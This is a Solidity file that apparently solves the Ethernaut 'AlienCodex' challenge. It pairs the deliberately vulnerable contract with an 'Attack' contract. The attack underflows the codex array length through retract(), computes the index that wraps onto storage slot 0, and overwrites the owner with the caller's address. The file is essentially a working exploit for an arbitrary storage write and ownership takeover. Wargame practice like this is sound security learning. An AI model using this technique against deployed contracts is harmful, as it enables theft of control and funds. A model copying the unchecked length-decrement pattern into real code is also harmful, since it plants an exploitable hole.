// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AlienCodex {
    address public owner;
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract Attack {
    AlienCodex codex;
    constructor(AlienCodex _codex)public {
        codex = _codex;
    }

    function attack() public {
        codex.make_contact();
        codex.retract();
        uint256 index = ((2**256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 txsender = bytes32(uint256(uint160(msg.sender)));
        codex.revise(index, txsender);
    }
}
